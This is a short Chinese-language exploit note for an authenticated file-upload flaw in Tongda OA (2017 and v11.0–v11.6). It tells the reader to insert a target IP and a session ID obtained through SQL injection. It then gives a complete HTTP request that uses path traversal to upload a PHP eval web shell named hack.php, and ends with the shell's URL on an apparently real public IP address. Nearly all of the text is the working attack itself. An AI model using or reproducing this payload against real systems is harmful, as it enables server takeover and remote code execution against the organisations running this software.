# 通达oa后台上传generaldata_centerutilsupload.php 2017版v11.0-v11.6

    ## **影响版本:2017版/v11.0-v11.6**

修改目标IP与Cookie中PHPSESSID的值(SQL注入获取到的SID)

```
POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
Host: 60.190.185.74
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 171
Cookie: PHPSESSID=bvdnf1pq3ag7c7gej46f6i4g80;_SERVER=
Content-Type: multipart/form-data; boundary=c634d2ccb38357de0be7d154d21ebf07

--c634d2ccb38357de0be7d154d21ebf07
Content-Disposition: form-data; name="FILE1"; filename="hack.php"

<?php eval(@$_POST['a']); ?>
--c634d2ccb38357de0be7d154d21ebf07--
```

http://60.190.185.74:88/_hack.php
